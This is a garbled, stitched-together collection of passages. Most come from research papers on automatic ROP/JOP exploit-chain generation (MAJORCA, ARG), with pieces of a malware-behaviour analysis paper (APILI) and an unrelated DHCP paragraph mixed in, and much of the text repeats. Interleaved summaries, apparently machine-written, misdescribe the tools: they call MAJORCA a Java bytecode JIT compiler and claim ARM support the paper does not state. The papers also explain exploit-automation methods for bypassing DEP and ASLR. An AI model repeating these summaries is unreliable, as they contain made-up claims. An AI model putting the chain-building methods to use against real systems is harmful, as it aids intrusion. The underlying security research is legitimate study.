It can generate ROP chains for registers initialization, me mory initialization, system and function calls for both x86 and MIPS architecture. The tool \ufb01nds both ROP and JOP gadgets and classi\ufb01es them by semantic types. After that, MAJORCA \ufb01lters and sorts them by quality. It builds a graph of moves between registers. It also creates DAGs initializing memor y and registers. Then, the tool iteratively selects DAGs to construct the requested ROP chain. In the end, MAJORCAbetween registers. It also creates DAGs initializing memor y and registers. Then, the tool iteratively selects DAGs to construct the requested ROP chain.

The primary goal of MAJORCA is to automate the process of creating exploits by finding and constructing chains of gadgets, which are small pieces of code that can be executed in sequence to achieve a desired effect.\n\nThe tool begins by discovering ROP and JOP gadgets in the target binary and classifying them based on their semantic types.

ROP is a type of exploit technique used in software vulnerability exploitation, where an attacker crafts a sequence of instructions from the function return addresses in the stack to achieve their desired goal, such as code execution or data manipulation.\n\nMAJORCA's primary function is to automate the process of generating ROP chains. It starts by scanning the target binary for ROP and JOP (Jump-Oriented Programming) gadgets. ROP gadgets are instructions that end with a return instruction, while JOP gadgets are instructions that end with a jump instruction. MAJORCA classifies these gadgets based on their semantic types, which can include register initialization, memory initialization, system calls, and function calls.\n\nAfter finding and classifying the gadgets, MAJORCA filters and sorts them based on their quality. The quality of a gadget is determined by various factors, such as the reliability of the gadget, the number of required arguments, and the presence of any security mitigations that may interfere with the gadget's functionality.\n\nMAJORCA then builds a graph of moves between registers to determine the best sequence of gadgets to use in constructing the ROP chain.

Code-reuse attacks exploit vulnerabilities by chaining together small pieces of code, called gadgets, to execute a payload. The attacker locates these gadgets in the memory of a target program and chains them together using ROP techniques.\n\nMAJORCA simplifies the process of creating a ROP chain by automating the assembly of the gadgets. It supports multiple architectures, including x86, x86_64, ARM, and MIPS. The tool can be used to create ROP chains for various exploits, making it a valuable resource for security researchers and attackers alike.\n\nThe authors of MAJORCA have provided contact information for themselves, allowing interested parties to reach\n\n\n Multi Architecture JOP, also known as MAJORCA, is a Python library designed to facilitate the creation and implementation of ROP (Return-Oriented Programming) chains on various architectures. ROP is a type of exploit technique used in software vulnerability exploitation, where an attacker crafts a sequence of instructions, called a ROP chain, from the existing code in the target application or operating system.\n\nThe MAJORCA library, developed by the authors described in the context provided, is a multi-architecture solution. This means it supports the creation and implementation of ROP chains on multiple architectures, making it a versatile tool for exploit developers or researchers. The library includes a ROP chain assembler, which is responsible for generating the ROP chain based on the target architecture and the available gadgets (small pieces of code) in the target environment.\n\nThe human-readable ROP chain in Fig. 6 is a visual representation of the sequence of instructions that make up the ROP chain. Each instruction in the chain corresponds to a specific gadget in the target environment. The attacker crafts the ROP chain to achieve their desired goal, such as gaining control of the execution flow or manipulating data in the target application or operating system.\n\nThe MAJORCA library simplifies the process of setting up ROP chains by providing a unified interface for multiple architectures. This makes it a valuable tool for researchers and exploit developers who need to test and understand the behavior of ROP chains on various platforms.\n\n\nMAJORCA is a multi-architecture Just-In-Time (JIT) compiler for both Java bytecode (JOP) and Return-Oriented Programming (ROP) chains.

It can use both ROP and JOP gadgets to construct ROP chains. When using JOP gadgets, MAJORCA combines each JOP gadget with a ROP gadget that loads the next address value to the jump target register. This ensures that the output registers of the JOP gadget don't conflict with those of the ROP gadget.\n\nTo generate ROP chains, MAJORCA first identifies ROP and JOP gadgets within the target binary. These gadgets are classified based on their semantic types, such as register initialization, memory initialization, system calls, and function calls. Afterward, MAJORCA filters and sorts the gadgets based on their quality.\n\nNext, MAJORCA constructs a graph of moves between registers to understand the dependencies and relationships between different registers. Using this information, MAJORCA creates Directed Acyclic Graphs (DAGs) for initializing memory and registers.\n\nThen, MAJORCA iteratively selects DAGs to construct the requested ROP chain. Careful consideration is given to selecting the most reliable and effective combinations of gadgets to minimize the risk of failure or detection. Once the optimal combination of gadgets is chosen, MAJORCA generates the ROP chain by linking the selected gadgets together.\n\nFinally, the generated ROP chain is output in a human-readable format, enabling easy modification and extension for further research or exploitation purposes.", "context": "Infos:\n(\"'while others use SMT solvers [19, 27]. On the \ufb01nal stage, the generated ROP chain may be embedded in multi staged exploits [40, 41]. We search ROP and JOP gadgets and classify them by pa- rameterized types [42] via instruction concrete interpret ation. Classi\ufb01ed gadgets constitute a gadget catalog that is proce ssed by \ufb01ltering and prioritizing. Filtering and prioritizing r educe search space. The gadget catalog is also extended by JOP combining. Search algorithm builds chains by searching for suitable gadgets and their combination considering their s e- mantics. We also thoroughly consider restricted symbols bo th in gadget addresses and data. It is crucial to take account of restricted symbols during chain generation. For example, if the strcpy function pro- cesses input data bytes, they cannot contain zero. It is wort h noting that restricted symbols can be both in gadget address es and in data. However, just a few authors consider restricted symbols in the chain generation methods [17]. The paper makes the following contributions: 1) We present the method to automatically generate both ROP and JOP payloads in an architecture agnostic manner. 2) We present an algorithm that considers restricted sym- bols both in gadget addresses and data. 3) We implement presented techniques in MAJORCA that can generate both ROP and JOP chains for x86 and MIPS considering restricted symbols thoroughly. 4) We present rop-benchmark [43] to compare MAJORCA with open-source rop-compilers. 5) We propose ROP chaining metric and use it to estimate the probability of successful ROP chaining for different operating systems with the portfolio of ROP compilers. II. G ADGET CATALOGING MAJORCA uses ROPGadget [25] to search for gadgets in binaries. It uses the back searching algorithm [7] that star ts from every encountered ret instruction. The experiments led us to limit the depth by 40 bytes since the bigger value does not result in more gadgets. Furthermore, we discard gadgets'\\n'successful, then the ROP chain is not workable. Ropper has dashes in this column because it does not correctly signalize that chain generation failed. 3) TL \u2014 the number of \ufb01les, for which a tool runtime exceeds the time limit of 1 hour. We propose to de\ufb01ne a ROP chaining metric as follow: M=OK/HAS SYSCALL , whereOK is the number of \ufb01les such that at least one tool from the portfolio successfu lly generates a workable ROP chain, and HASSYSCALL is the number of \ufb01les containing the system call gadget. The smaller value Mthe better OS is defended from ROP chaining. The Table II contains metric values for different operating systems (CentOS 7, Debian 10, OpenBSD 6.2, OpenBSD 6.4) in the row heading \u201dROP chaining metric\u201d. We can conclude that Debian 10 is less defended from ROP (and JOP) chaining than other operating systems. Moreover, the OpenBSD activi ty of reducing the number of gadgets noticeably reduces ROP chaining metric. However, almost half of binaries containi ng syscall gadgets can be used for successful ROP chaining. Considering the results in Table II, we can conclude that MAJORCA outperforms other open-source tools. Besides, MAJORCA covers almost all successful cases of other tools. It does not cover only 8 binary \ufb01les: 1) 2 timeouts for OpenBSD clang binaries. It happens due to big \ufb01le sizes. Later, we can add a simple heuristic for such huge \ufb01les because they probably contain almost any gadgets, so the tool may have a special case to avoid excessive search. 2) 2 unworkable ROP chains were generated due to impre- cise gadget classi\ufb01cation. 3) 4 ROP chains were not generated because MAJORCA does not support gadgets ending with call instructions. It is a technical limitation that can be \ufb01xed in the future. Tools represented in Table II do not support MIPS architec- ture. We benchmark MAJORCA for MIPS without them on32-bit Malta Linux. MAJORCA successfully generates 112 ROP chains (OK) out of 529 \ufb01les.

Short pieces of code called gadgets are chained toge ther to execute some payload. Code-reuse attacks can exploit vul - nerabilities in the presence of operating system protectio n that prohibits data memory execution. The ROP chain constructio n task is the code generation for the virtual machine de\ufb01ned by an exploited executable. It is crucial to understand how power ful ROP attacks can be. Such knowledge can be used to improve software security. We implement MAJORCA that generates ROP and JOP payloads in an architecture agnostic manner and thoroughly consider restricted symbols such as null bytes t hat terminate data copying via strcpy. The paper covers the whol e code-reuse payloads construction pipeline: cataloging ga dgets, chaining them in DAG, scheduling, linearizing to the ready- to- run payload. MAJORCA automatically generates both ROP and JOP payloads for x86 and MIPS. MAJORCA constructs payloads respecting restricted symbols both in gadget addresses and data. We evaluate MAJORCA performance and accuracy with rop- benchmark and compare it with open-source compilers. We sho w that MAJORCA outperforms open-source tools. We propose a ROP chaining metric and use it to estimate the probabilities of successful ROP chaining for different operating systems with MAJORCA as well as other ROP compilers to show that ROP chaining is still feasible. This metric can estimate the ef\ufb01 ciency of OS defences.

It is a lightweight and simple implementation for special input language determining ROP chain. Moreover, these calls can be integrated into any Python script that use rs may utilize for exploit generation. MAJORCA supports x86 architecture (both 32 and 64-bit) and MIPS.

We benchmark MAJORCA for MIPS without them on32-bit Malta Linux. MAJORCA successfully generates 112 ROP chains (OK) out of 529 \ufb01les. Test \ufb01les were acquired from Malta Debian OS. All of them contain syscall gadget. Unworkable ROP chains were not generated (F is 0). The only one ROP chain generation has a timeout (TL is 1). Moreover, we updated rop-benchmark with tests containing restricted symbols. The last row in Table II contains result s only for MAJORCA because other tools generate no workable payloads. Even having banned slash symbol ( 2f), MAJORCA suc- cessfully generates a signi\ufb01cant fraction of ROP chains gen - erated without restricted symbols. IX. C ONCLUSION In the paper we present techniques to construct ROP chains automatically. We implemented them in the MAJORCA tool. It can generate ROP chains for registers initialization, me mory initialization, system and function calls for both x86 and MIPS architecture. The tool \ufb01nds both ROP and JOP gadgets and classi\ufb01es them by semantic types. After that, MAJORCA \ufb01lters and sorts them by quality. It builds a graph of moves between registers.

We developed algorithms that solve the task of generating ROP chains in the presence of restricted symbols. First of all, MAJORCA removes all gadgets containing restricted symbols in addresses.

The gadget frame contains values of gadget parameters (e.g., the value loade d into the register from the stack) and the next gadget address . The frame beginning is determined by the value of the stack pointer before executing the \ufb01rst gadget instruction. A. Gadget Preprocessing Gadget catalog does not represent gadgets that load multipl e values from the stack to registers at once, e.g., pop rax ; pop rbx ; pop rdi ; ret1. We derive these semantics by combining several gadgets from the catalog. We \ufb01nd all gadgets that load registers and have same virtual address. T he \ufb01rst gadget loads rax, the second one loads rbx, and the third one loads rdi. Based on these gadgets, we construct gadgets with any non-trivial combination of loadable regis ters: 1)rax,rbx,rdi; 2)rax,rbx; 3)rax,rdi; 4)rax; 5)rbx,rdi; 6)rbx; 7)rdi. Then we add them all into the catalog. We actually have several catalog entries for the sa me assembly but they have different sets of output and clobbere d registers, e.g., the gadget loading rax andrbx hasrdi as clobbered register, the gadget loading rax andrdi hasrbx as clobbered register. The support of such gadgets is a key feature in comparison with Schwartz et al. [9]. MAJORCA can use both ROP and JOP gadgets. We com- bine every JOP gadget with a ROP gadget into a bigger gadget similar to ROPium [26] (ex. ROPGenerator). Every JOP gadget is complemented by the ROP gadget that loads the next address value to the jump target register. The ROP gadge t output registers should not intersect with the JOP gadget in put registers. For instance, \u2022pop rax ; pop rcx ; ret \u2022pop rdx ; jmp rcx . The next gadget address is loaded from the stack to register rcx bypop rcx . The combined gadget is just the usual ROP gadget that can be used as any other ROP gadget. We \ufb01lter and prioritize gadgets [47] to reduce the ROP chain construction time.

ROP is a type of exploit technique used in software vulnerability exploitation, where an attacker crafts a sequence of instructions from the function return addresses in the stack to achieve their desired goal, such as code execution or data manipulation.\n\nMAJORCA's primary function is to automate the process of generating ROP chains. It starts by scanning the target binary for ROP and JOP (Jump-Oriented Programming) gadgets. ROP gadgets are instructions that end with a return instruction, while JOP gadgets are instructions that end with a jump instruction. MAJORCA classifies these gadgets based on their semantic types, which can include register initialization, memory initialization, system calls, and function calls.\n\nAfter finding and classifying the gadgets, MAJORCA filters and sorts them based on their quality. The quality of a gadget is determined by various factors, such as the reliability of the gadget, the number of required arguments, and the presence of any security mitigations that may interfere with the gadget's functionality.\n\nMAJORCA then builds a graph of moves between registers to determine the best sequence of gadgets to use in constructing the ROP chain.

The primary goal of MAJORCA is to automate the process of creating exploits by finding and constructing chains of gadgets, which are small pieces of code that can be executed in sequence to achieve a desired effect.\n\nThe tool begins by discovering ROP and JOP gadgets in the target binary and classifying them based on their semantic types. Semantic types refer to the functionality of each gadget, such as register initialization, memory initialization, system calls, or function calls. After classification, MAJORCA sorts the gadgets based on their quality, which is determined by various factors such as their reliability, availability, and the ease with which they can be chained together.\n\nMAJORCA then constructs a graph of moves between registers to understand the dependencies and relationships between different registers.

ROP is a type of exploit technique used in software vulnerability exploitation, where an attacker crafts a sequence of instructions, called a ROP chain, from the existing code in the target application or operating system.\n\nThe MAJORCA library, developed by the authors described in the context provided, is a multi-architecture solution. This means it supports the creation and implementation of ROP chains on multiple architectures, making it a versatile tool for exploit developers or researchers. The library includes a ROP chain assembler, which is responsible for generating the ROP chain based on the target architecture and the available gadgets (small pieces of code) in the target environment.\n\nThe human-readable ROP chain in Fig. 6 is a visual representation of the sequence of instructions that make up the ROP chain. Each instruction in the chain corresponds to a specific gadget in the target environment. The attacker crafts the ROP chain to achieve their desired goal, such as gaining control of the execution flow or manipulating data in the target application or operating system.\n\nThe MAJORCA library simplifies the process of setting up ROP chains by providing a unified interface for multiple architectures. This makes it a valuable tool for researchers and exploit developers who need to test and understand the behavior of ROP chains on various platforms.\n\n\n MAJORCA, as described in the provided abstract, is a multi-architecture assembly-level JOint POint and ROP (Return-Oriented Programming) chain assembler developed by Alexey Nurmukhametov, Alexey Vishnyakov, Vlada Logunova, and Shamil Kurmangaleev from the Ivannikov Institute for System Programming of the Russian Academy of Sciences and Moscow Institute of Physics and Technology in Moscow, Russia.\n\nThe authors of MAJORCA have created a tool that automates the process of constructing a ROP chain, which is a common technique used in code-reuse attacks. Code-reuse attacks exploit vulnerabilities by chaining together small pieces of code, called gadgets, to execute a payload. The attacker locates these gadgets in the memory of a target program and chains them together using ROP techniques.\n\nMAJORCA simplifies the process of creating a ROP chain by automating the assembly of the gadgets. It supports multiple architectures, including x86, x86_64, ARM, and MIPS.

In terms of time complexity, the results show that, on average, each epoch requires approximately 45 minutes for both train- ing and validation, translating to an average processing time of 0.19 seconds per sample. Remarkably, during the inference stage, we observed similar results, with an average processing time of 0.19 seconds per sample. In the API Locating, the computing of the TOP-5 results typically takes an average of 5 seconds per sample. Due to APILI being a Deep Learning model, the process of updating 129,267 parameters each time is more costly compared to conventional methods. A limitation of APILI is its utilization of a deep learning approach, which introduces a degree of inherent uncertainty. In our empirical study, we observed that APILI could achieve an accuracy of 80% using the Top-5 metric, which may meet user requirements to some extent. Nevertheless, there is still significant potential for improvement. VII. C ONCLUSION Traditional tools for dynamic malware analysis require intensive human effort to build knowledge and analyze the malicious behavior of a malware sample. Our system reduces the workload for analysts in discovering malicious behav- ior and ranking suspicious system resources. We employed Cuckoo Sandbox, an open-source and publicly available sand- box, for malware profiling to recorded API traces. However, Cuckoo Sandbox is not able to monitor advanced injection techniques and handle malware evasions. The proposed model, APILI, is not restricted to Cuckoo Sandbox; it can be applied to other malware profiling tools. We use API call embeddings and technique representation to construct domain knowledge and perform threat reasoning. The technique representation uncovers the semantics of techniques and reveals how a technique is implemented in a program.

APILI defines mul- tiple attentions between API calls, resources, and techniques, incorporating MITRE ATT&CK framework, adversary tactics, techniques and procedures, through a neural network. We employ fine-tuned BERT for arguments/resources embedding, SVD for technique representation, and several design enhancements, including layer structure and noise addition, to improve the locating performance. To the best of our knowledge, this is the first attempt to locate low-level API calls that correspond to high- level malicious behaviors (that is, techniques). Our evaluation demonstrates that APILI outperforms other traditional and machine learning techniques in both technique discovery and API locating. These results indicate the promising performance of APILI, thus allowing it to reduce the analysis workload.

The most noticeable instance of this is when a client tries to renewits lease with a specific DHCP server. Since it sends this request unicast, it can go to aDHCP server on a different network using conventional IP routing, and the relay agent doesnot need to be involved.Key Concept: To permit DHCP clients and DHCP servers to reside on differentphysical networks, an intermediary device is required to facilitate message exchangebetween networks.

Besides APILI can achieve API Call locating, the technique distinctions between APILI and MAMBA lie in the following aspects: (A) APILI possesses the capability to perform inference on out-of-vocabulary unseen samples by leveraging our custom fine-tuned BERT model, whereas MAMBA requires continuous maintenance and retraining of PV-DM with those newly found vocabulary set. (B) Moreover, through a multilayer iterative design, the integration of noise, and the introduction of a novel proposed loss function, APILI has achieved significant advancements in the API Locating. Specifically, there has been an impressive improvement of approximately 57% in the TOP1 score and roughly 73% in the TOP5 score over MAMBA. (C) Finally, APILI does not neces- sitate the maintenance of the submodels of Mitre knowledge. Instead, it employs SVD to capture technique information, thus reducing the workload. These improvements have substantially alleviated the burdens of cybersecurity researchers. VI. D ISCUSSION AND CONCLUSION A.

Further- more, the ordering of API calls can lead to the discovery of different techniques, adding additional complexity to the task of discovering techniques and locating APIs. In light of these challenges, a deep learning approach presents a promising solution that offers improved accuracy and efficiency and thus warrants further investigation. The objective of this study is to develop a neural network model for identifying malware behavior by analyzing the exe- cution trace of Windows malware and discovering techniques along with their corresponding API calls. The study covers two main challenges. The first challenge involves discovering the behavior of malware. To address this, the study leverages manipulated resources associated with MITRE techniques as foundational knowledge and subsequently identifies thesetechniques from the execution trace. The second challenge is the task of locating API calls. This involves aligning high-level techniques with the low-level execution trace to pinpoint the corresponding API calls. This paper introduces APILI (API LocatIng system), a solution designed to tackle the aforementioned challenges. APILI is an innovative deep learning-based system that specif- ically targets the identification of embedded techniques in Windows malware traces and their corresponding API calls. This distinctive capability sets APILI apart from existing signature-based systems and, to the best of our knowledge, makes it the first deep learning approach to accomplish this objective. To assess the effectiveness and methodology of APILI, we conducted an evaluation using the MITRE ATT&CK framework alongside real-world data. The results demonstrate APILI\u2019s proficiency in detecting malicious behav- ior through deep learning analysis. Our experiments indicate\\'\\n\\'ple executes 244 API calls within a single process and manipulates 218 system resources. Based on the Cuckoo sandbox signatures, the sample is labeled with five tech- niques, including executing malicious payloads (T1129 Shared Modules) to encrypt specific files on the victim system, creating a service to ensure persistence (T1053 Scheduled Task, T1547.001 Autostart Execution, T1543.003 Windows Service), and setting the file attribute to a system file to evade detection (T1564.001 Hidden Files). Algorithm 1of APILI successfully identifies the five techniques implemented in this sample. For each discovered technique, Algorithm 2first determines the resource with the highest (or K highest) value of technique attention and then uses resource attention to identify API calls. The API locating process produced a TOP-5 Score of 100% and a Relevance rate of 6.41%. For the technique (T1129), the correct resource is \u201c. . . tasksche.exe\u201d, ranked number 5 by APILI, which maps to three API calls OpenFile, CreateFile andWriteFile, as shown in Table XI. Figure 4depicts that the technique attention of tasksche.exe ranked number 5 for T1129. Then check its resource attention list that the top API call partition consists of three API calls, NtOpenFile, NtCreateFile, and NtWriteFile. Details on TOP-5 resources corresponding to each technique can be found in the Appendix E. In general, located resources and API calls are of relatively high importance. Similarly, the malware sample creates a service \u201cmssecsvc2.0\u201d to implement (T1053, T1547.001, and T1543.003). Corresponding to these techniques, the located resource \u201cmssecsvc2.0\u201d is ranked inmalware sample creates a service \u201cmssecsvc2.0\u201d to implement (T1053, T1547.001, and T1543.003). Corresponding to these techniques, the located resource \u201cmssecsvc2.0\u201d is ranked in the first, second and fourth partitions, respectively.

Both tools can handle bina-assembly code), and a decompiler (convert assembly code to a higher-order representation, similar to C code), and a vari- ety of data \ufb02ow analysis tools. Both tools can handle bina- ries that have been compiled on a variety of architectures (such as x86/64 or ARM64). In the \ufb01eld of security, quite a bit of work has focused on understanding the behavior of ma licious applications by exam- ining their library API calls [4], [5], [6], [7], [8], [9], [10], [11], [12]. The intuition behind this is that calls made to library APIs (such as Windows DLLs) can capture the important underlying semantics of the malware\u2019s attac king behavior [13]. However, uncovering API calls is particul arly hard as the compiler might have mangled the inlined body of the called function together with the code at the calling site in complex ways. Both Ghidra and Hexrays have specially engin eered functionality for recov- ering calls to library functions. These functions are considered very important by the develope rs of these tools and are explic- itly documented and advertised. Both solutions use a database of assembly-level signa- tures for each potentially inlined library call.

By minimizing this loss, APILI learns to accurately identify the techniques implemented in malware samples. Lce(y,\u02c6y)= \u22121 n\u2211 (yn\u00d7ln(\u02c6yn)+(1\u2212yn)\u00d7ln(1\u2212\u02c6yn)) (10)The loss function Lrsc(dw,p), defined in Formula (11), is a resource distance function that quantifies the difference between the attention value of the true resources p(denoted asdt,p w), and the maximum attention value of dt w, associated with a particular technique yt. Lrsc(p,dw)=T\u2211 t(max( dt w)\u2212dt,p w) (11) This loss function helps APILI maximize the attention value of the correct resources by minimizing the resource distance. It ensures that the model focuses on the appropriate resources for each technique. It is important to note that Lrsc(dw,p)is calculated for each malware sample, and all N samples are considered during APILI training. To achieve both objectives, APILI first aims to maximize the attention value of the resource location label in the technique attention dwbefore predicting the technique. The resource distance function Lrsc(p,dw)in Formula 11 summarizes the distances between the labeled resource dt,p wand the current maximum within dt wfor each technique. Subsequently, the technique prediction in Formula 12 relies on the optimized Lrsc. \u02c6y=\u03c6( fc( rv\u00d7min dw(T\u2211 t(max( dt w)\u2212dt,p w))))\\'\\n\\'wand the current maximum within dt wfor each technique. Subsequently, the technique prediction in Formula 12 relies on the optimized Lrsc. \u02c6y=\u03c6( fc( rv\u00d7min dw(T\u2211 t(max( dt w)\u2212dt,p w)))) =\u03c6(fc(rv\u00d7min dw(Lrsc(p,dw)))) (12) By incorporating Formula (12) into Formula (10), APILI is able to train an effective neural network using Formula (13) for both technique discovery and API locating in an end-to-end manner. min \u03b8L=min \u03b8(Lce(y, \u03c6(fc(rv\u00d7min dw(Lrsc(p,dw)))))) =min \u03b8(Lce(y,\u02c6y)) (13) Algorithm 1summarizes the APILI training process for a single process.

In scenarios where a malware sample generates multiple processes, each process is treated independently and their results are subsequently combined. H. API Locating After training the neural network model, APILI leverages its two attention mechanisms to automatically discover malware techniques and identify the corresponding API calls without human intervention. APILI achieves this by sorting the resource attention values in descending order for each discovered technique, establishing connections between the detected techniques and API calls. The process for API locating is illustrated in Figure 3with the example in Figure 1. The black shades in the figure represent the range of attention values, with darker shades indicating higher attention values.

PMP architectures are computer systems where multiple processors are connected through a common I/O bus, enabling them to share I/O resources and communicate more efficiently than in traditional multi-processor systems. ARG provides multiple natural and easy-to-use interfaces for managing and interacting with these systems, allowing users to configure the system, manage I/O resources, and initiate graceful shutdowns.\n\nOn the other hand, MAJORCA (MIPS and x86 Automatic Exploit Generator for ROP and JOP Chains) is a tool designed for generating ROP (Return-Oriented Programming) and JOP (Jump-Oriented Programming) chains for both x86 and MIPS architectures. ROP is a technique used in software vulnerability exploitation, where an attacker crafts a sequence of instructions from the function return addresses in the stack to achieve their desired goal, such as code execution or data manipulation.

III. ARCHITECTURE DESIGN AND IMPLEMENTATION A. ARCHITECTURE OVERVIEW This paper proposes a new technology that bypasses DEP and W\u2295X protection to automatically generate ROP chains \u2014 ARG. Fig. 2 shows the end-to-end work\ufb02ow of ARG. Firstly,ARG \ufb01nds available gadgets as input variables. Secondly, it uses AMOCO to analyze the semantics of the input (avail- able gadget set). Thirdly, in order to construct DAG to extract the transitive relation between registers, it traverses the DAG tree to \ufb01nd all reachable paths, and then uses Z3 to back- calculate these paths. Finally, ROP chains are automatically generated. In the following, we will introduce each step of ARG in detail. B. DISCOVERING GADGETS AUTOMATICALLY The \ufb01rst step is to discover gadgets automatically. Instead of using ROPgadget tool [30] to extract the gadget directly, we take the search algorithm in ROPgadget and redevelop it to meet our needs. The principle of extracting the gadget is shown in Algorithm 1. We de\ufb01ne the discovery rules for gad- gets, \ufb01lter them according to these rules, and then store them in Zope Object Database (ZODB) [31] after preprocessing. The number of gadgets here is huge. It is related to the size of the program, where the larger the program is, the more gadgets it contains. When extracting gadgets automatically, we compared the performance of three different tools in searching for gadgets. Table 1 shows the performance of the three tools. It can be seen that the overall performance of the ROPgadget is better than others. ROPgadget can \ufb01nd almost as many gad- gets as Binary Analysis and Reverse engineering Framework (BARF) [32], but the time cost is much lower than BARF. Although the overall performance of ROPgadget is supe- rior, the analysts cannot stand such a long-time searches for gadgets in large-sized programs. Therefore, we must solve the following problems. (1) It takes a long time to extract'\\n'there is no failure of ROP chains generation due to discarding critical instructions. In addition, it does not take a long time to convert IL, thus ARG can improve the ef\ufb01ciency of analyzing gadgets. F. OTHER Finally, we do some work on details such as optimizing algorithms, avoiding bad characters, templating functions, and searching for gadgets in a multi-process manner. ARG supports multi-processor architectures such as i386, AMD64, ARM, and MIPS, and it improves the practicability and confrontation in the real environment. Since MIPS is less common, there is still some work left for further research. VII. CONCLUSION In this paper, we proposed and implemented a new tech- nology \u2014 ARG, which supports automatically generatingROP chains. The proposed technique can satisfy the precondi- tions of constraint solving by automatically \ufb01nding the avail- able gadgets by using AMOCO analysis, DAG, topological sorting, and the Z3 solver. Instead of IL, we translated directly to symbolize gadgets, and then Z3 solver is adopted to solve random addresses and write it to the stack. The experimental results showed that ARG is able to reduce exploit payloads, and it takes only 3-5 seconds to \ufb01nish control-\ufb02ow hijacking, compared to manual analysis, which takes at least 60 minutes. Also, it can effectively bypass both W \u2295X and ASLR. In addi- tion, ARG has good compatibility and practicability, can sup- port multi-processor architectures, provides multiple natural, easy-to-use interfaces, and can directly call these interfaces through pwntools. We believe that ARG will become a very popular and practical tool in the near future.

REFERENCES'\\n'Intel(R) Core(TM) i7 cpu 920 @ 2.67GHz CPU, which is faster than our Intel(R) Core(TM) i5-6200U cpu @ 2.30GHz CPU, the performance of ARG is still much better than Q. D. ROBUSTNESS OF EXPLOIT We evaluate the robustness of automated generated exploit in two ways: (1) whether it can effectively bypass both W \u2295X and ASLR; (2) how to handle exceptions that cannot \ufb01nd critical registers. From Table 8, we \ufb01nd that the exploit generated by ARG can bypass both W \u2295X and ASLR and has the expected robustness. The problem is that we may not \ufb01nd critical registers to satisfy the transitive relation. In the automated assignment of gadget, if there is no corresponding register transitive relation, the robust exploit cannot be generated by ARG. To solve this problem, we design and implement an exception handling mechanism to prompt the users that a certain type of register is not found. In addition, we frequently encounter the problem that the of\ufb01cial POC has a lot of \ufb01xed addresses, so POC may not be executed in a different environment. However, in this paper, the problem mentioned above does not occur, because the generated ROP chain is automatically solved by byte-by-byte, and it is written into memory once. Therefore, it is more robust against bypass defenses. VI. DISCUSSION AND FUTURE WORK This paper proposes and implements a new technology of automatically generating ROP chains \u2014 ARG to solve the problem of lost time and cost of manual construction. This approach can reduce up to 80% of ROP exploit payloads and take only 3-5 seconds to successfully exploit. More- over, it not only improves the ef\ufb01ciency of analysis, but also can ef\ufb01ciently generate a large number of ROP chainscode, without any manual intervention. The experimental results show that the automated construction of ROP chains is successful. We have successfully generated 9 ROP chains from 9 real experimental data (CVE). Also, all automated generated exploits can successfully bypass DEP and ASLR'\\n'system calls, thus, memory should be mapped and data should be written into memory manually before emulation starts at the speci\ufb01ed address. In addition, the emulator forwards executing process. When writing a value into memory, the emulator can only get the path that this value passes, or get the memory address that this value reaches. If a data operation occurs during this process that causes the value to be changed or the sequence to be scrambled, it is dif\ufb01cult for the emulator to continueanalyzing. Compared with the emulator, symbol execution is easier to analyze. Moreover, the emulator requires more manual operations and is not suitable for automated analysis. In summary, we adopted the symbol execution technique to automatically generate ROP chains. Through extensive research, we found that many tools use IL, for example: Valgrind [14] and Angr [35]. LLVM is a very classic and popular tool, while LLVMIR as its IL is also commonly used. Almost all IL have such problem: discarding any instruction sequence that might cause the program to crash. Moreover, using IL can also causes a lot of performance overhead. ARG does not use IL. It is based on AMOCO and it can directly analyze binary programs. Compared with the way of using IL, ARG can directly obtain the mapping of symbols and improve the accuracy of analyzing gadgets, while reducing the overhead of performance. D. COMBINING GADGETS AUTOMATICALLY The automated combination of gadgets is the core part of this paper. There are two preconditions that must be satis\ufb01ed before using the symbol execution to automatically construct ROP chains: (1) describe the transitive relation of the gadget. (2) determine the order in which the gadget is executed. The purpose of this is to create constraints for the Z3 solution. 1) DAG As we all know, gadgets are scattered and discontinuous fragments of instructions in the programs and libc libraries. The relationship between these gadgets is like a complicated1) DAG'\\n'while others use SMT solvers [19, 27]. On the \ufb01nal stage, the generated ROP chain may be embedded in multi staged exploits [40, 41]. We search ROP and JOP gadgets and classify them by pa- rameterized types [42] via instruction concrete interpret ation. Classi\ufb01ed gadgets constitute a gadget catalog that is proce ssed by \ufb01ltering and prioritizing. Filtering and prioritizing r educe search space. The gadget catalog is also extended by JOP combining. Search algorithm builds chains by searching for suitable gadgets and their combination considering their s e- mantics. We also thoroughly consider restricted symbols bo th in gadget addresses and data. It is crucial to take account of restricted symbols during chain generation. For example, if the strcpy function pro- cesses input data bytes, they cannot contain zero. It is wort h noting that restricted symbols can be both in gadget address es and in data. However, just a few authors consider restricted symbols in the chain generation methods [17]. The paper makes the following contributions: 1) We present the method to automatically generate both ROP and JOP payloads in an architecture agnostic manner. 2) We present an algorithm that considers restricted sym- bols both in gadget addresses and data. 3) We implement presented techniques in MAJORCA that can generate both ROP and JOP chains for x86 and MIPS considering restricted symbols thoroughly. 4) We present rop-benchmark [43] to compare MAJORCA with open-source rop-compilers. 5) We propose ROP chaining metric and use it to estimate the probability of successful ROP chaining for different operating systems with the portfolio of ROP compilers. II. G ADGET CATALOGING MAJORCA uses ROPGadget [25] to search for gadgets in binaries. It uses the back searching algorithm [7] that star ts from every encountered ret instruction. The experiments led us to limit the depth by 40 bytes since the bigger value does not result in more gadgets. Furthermore, we discard gadgets'\\n'successful, then the ROP chain is not workable. Ropper has dashes in this column because it does not correctly signalize that chain generation failed. 3) TL \u2014 the number of \ufb01les, for which a tool runtime exceeds the time limit of 1 hour. We propose to de\ufb01ne a ROP chaining metric as follow: M=OK/HAS SYSCALL , whereOK is the number of \ufb01les such that at least one tool from the portfolio successfu lly generates a workable ROP chain, and HASSYSCALL is the number of \ufb01les containing the system call gadget. The smaller value Mthe better OS is defended from ROP chaining. The Table II contains metric values for different operating systems (CentOS 7, Debian 10, OpenBSD 6.2, OpenBSD 6.4) in the row heading \u201dROP chaining metric\u201d. We can conclude that Debian 10 is less defended from ROP (and JOP) chaining than other operating systems. Moreover, the OpenBSD activi ty of reducing the number of gadgets noticeably reduces ROP chaining metric. However, almost half of binaries containi ng syscall gadgets can be used for successful ROP chaining. Considering the results in Table II, we can conclude that MAJORCA outperforms other open-source tools. Besides, MAJORCA covers almost all successful cases of other tools. It does not cover only 8 binary \ufb01les: 1) 2 timeouts for OpenBSD clang binaries. It happens due to big \ufb01le sizes. Later, we can add a simple heuristic for such huge \ufb01les because they probably contain almost any gadgets, so the tool may have a special case to avoid excessive search. 2) 2 unworkable ROP chains were generated due to impre- cise gadget classi\ufb01cation. 3) 4 ROP chains were not generated because MAJORCA does not support gadgets ending with call instructions. It is a technical limitation that can be \ufb01xed in the future. Tools represented in Table II do not support MIPS architec- ture. We benchmark MAJORCA for MIPS without them 